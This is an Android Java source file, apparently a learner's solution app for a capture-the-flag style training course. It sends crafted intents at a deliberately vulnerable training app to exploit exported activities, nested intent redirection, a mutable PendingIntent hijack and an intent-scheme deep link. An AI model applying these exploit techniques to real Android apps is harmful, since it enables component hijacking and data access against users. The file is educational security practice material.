package com.ookami.evilintent;

import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Looper;
import android.view.View;
import android.widget.Button;

import androidx.activity.EdgeToEdge;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import android.os.Handler;

public class MainActivity extends AppCompatActivity {

    private final ActivityResultLauncher<Intent> launcher = registerForActivityResult(
            new ActivityResultContracts.StartActivityForResult(),
            result -> {
                if (result.getResultCode() == RESULT_OK){
                    Utils.showDialog(MainActivity.this,result.getData());
                }
            }
    );

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        /*
         * ACTIVITIES EXERCISES
         */

        Button btnBasicExport = findViewById(R.id.basic_exported_activity);
        Button btnIntentWithExtras = findViewById(R.id.intent_with_extras);
        Button btnIntentWithUri = findViewById(R.id.intent_with_data_uri);
        Button btnStateMachine = findViewById(R.id.state_machine);
        Button btnIntentInIntent = findViewById(R.id.intent_in_intent);
        Button btnIntentRedirect = findViewById(R.id.intent_redirect);
        Button btnActivityLifecycle = findViewById(R.id.activity_lifecycle);

        btnBasicExport.setOnClickListener(
                new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        Intent payload = new Intent();
                        payload.setClassName(
                                "io.hextree.attacksurface",
                                "io.hextree.attacksurface.activities.Flag1Activity");
                        startActivity(payload);
                    }
                }
        );

        btnIntentWithExtras.setOnClickListener(
                new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        Intent payload = new Intent("io.hextree.action.GIVE_FLAG");
                        payload.setClassName(
                                "io.hextree.attacksurface",
                                "io.hextree.attacksurface.activities.Flag2Activity");
                        startActivity(payload);
                    }
                }
        );

        btnIntentWithUri.setOnClickListener(
                new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        Intent payload = new Intent("io.hextree.action.GIVE_FLAG");
                        payload.setClassName(
                                "io.hextree.attacksurface",
                                "io.hextree.attacksurface.activities.Flag3Activity");
                        payload.setData(Uri.parse("https://app.hextree.io/map/android"));
                        startActivity(payload);
                    }
                }
        );

        btnStateMachine.setOnClickListener(
                new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        String[] actions = {"INIT_ACTION","GET_FLAG_ACTION","BUILD_ACTION","PREPARE_ACTION"};

                        for (String action : actions) {
                            Intent payload = new Intent(action);
                            payload.setClassName(
                                    "io.hextree.attacksurface",
                                    "io.hextree.attacksurface.activities.Flag4Activity");
                            startActivity(payload);
                        }
                    }
                }
        );

        btnIntentInIntent.setOnClickListener(
                new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        Intent intent3 = new Intent();
                        intent3.putExtra("reason","back");

                        Intent intent2 = new Intent();
                        intent2.putExtra("return",42);
                        intent2.putExtra("nextIntent",intent3);

                        Intent intent1 = new Intent();
                        intent1.setClassName(
                                "io.hextree.attacksurface",
                                "io.hextree.attacksurface.activities.Flag5Activity");
                        intent1.putExtra("android.intent.extra.INTENT",intent2);
                        startActivity(intent1);
                    }
                }
        );

        btnIntentRedirect.setOnClickListener(
                new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        Intent intent3 = new Intent();
                        intent3.putExtra("reason","next");
                        intent3.setClassName(
                                "io.hextree.attacksurface",
                                "io.hextree.attacksurface.activities.Flag6Activity");
                        intent3.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);

                        Intent intent2 = new Intent();
                        intent2.putExtra("return",42);
                        intent2.putExtra("nextIntent",intent3);

                        Intent intent1 = new Intent();
                        intent1.setClassName(
                                "io.hextree.attacksurface",
                                "io.hextree.attacksurface.activities.Flag5Activity");
                        intent1.putExtra("android.intent.extra.INTENT",intent2);
                        startActivity(intent1);
                    }
                }
        );

        btnActivityLifecycle.setOnClickListener(
                new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        Intent payload = new Intent("OPEN");
                        payload.setClassName(
                                "io.hextree.attacksurface",
                                "io.hextree.attacksurface.activities.Flag7Activity");
                        startActivity(payload);

                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
                            Intent payload2 = new Intent("REOPEN");
                            payload2.setClassName(
                                    "io.hextree.attacksurface",
                                    "io.hextree.attacksurface.activities.Flag7Activity");
                            payload2.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP
                                    | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                            startActivity(payload2);
                        },1000);
                    }
                }
        );

        /*
         * ACTIVITIES RESULT EXERCISES
         */

        Button btnBasicActivityResponse = findViewById(R.id.basic_activity_result);
        Button btnResultWithFlag = findViewById(R.id.result_with_flag);

        btnBasicActivityResponse.setOnClickListener(
                new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        Intent trigger = new Intent();
                        trigger.setClassName(
                                "com.ookami.evilintent",
                                "com.ookami.evilintent.HextreeActivity"
                        );
                        trigger.putExtra("type","Flag8");
                        launcher.launch(trigger);
                    }
                }
        );

        btnResultWithFlag.setOnClickListener(
                new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        Intent trigger = new Intent();
                        trigger.setClassName(
                                "com.ookami.evilintent",
                                "com.ookami.evilintent.HextreeActivity"
                        );
                        trigger.putExtra("type","Flag9");
                        launcher.launch(trigger);
                    }
                }
        );

        /*
         * IMPLICIT INTENT EXERCISES
         */

        Button btnTrickyImplicitIntent = findViewById(R.id.tricky_implicit_intent);

        btnTrickyImplicitIntent.setOnClickListener(
                new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        Intent payload = new Intent();
                        payload.setClassName(
                                "io.hextree.attacksurface",
                                "io.hextree.attacksurface.activities.Flag12Activity"
                        );
                        payload.putExtra("LOGIN",true);
                        startActivity(payload);
                    }
                }
        );

        /*
         * PENDING INTENT EXERCISES
         */

        Button btnMutablePendingIntent = findViewById(R.id.mutable_pending_intent);

        btnMutablePendingIntent.setOnClickListener(
                new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        Intent payload = new Intent();
                        payload.setClassName(
                                "com.ookami.evilintent",
                                "com.ookami.evilintent.IntentHijackerActivity"
                        );

                        PendingIntent pending = PendingIntent.getActivity(
                                MainActivity.this,
                                0,
                                payload,
                                PendingIntent.FLAG_MUTABLE
                        );

                        Intent wrapper = new Intent();
                        wrapper.setClassName(
                                "io.hextree.attacksurface",
                                "io.hextree.attacksurface.activities.Flag22Activity"
                        );
                        wrapper.putExtra("PENDING",pending);
                        startActivity(wrapper);
                    }
                }
        );

        /*
         * DEEPLINK EXERCISES
         */
        Button btnSimpleDeeplink = findViewById(R.id.simple_deeplink);
        Button btnIntentScheme = findViewById(R.id.intent_scheme);

        btnSimpleDeeplink.setOnClickListener(
                new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        Intent payload = new Intent("android.intent.action.VIEW");
                        payload.setData(Uri.parse("https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href=hex://flag?action=give-me"));
                        startActivity(payload);
                    }
                }
        );

        btnIntentScheme.setOnClickListener(
                new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        Intent intent2 = new Intent("android.intent.action.VIEW");
                        intent2.setData(Uri.parse("https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href=" + Uri.encode("intent:#Intent;action=io.hextree.action.GIVE_FLAG;component=io.hextree.attacksurface/.activities.Flag15Activity;S.action=flag;B.flag=true;end")));
                        startActivity(intent2);
                    }
                }
        );
    }
}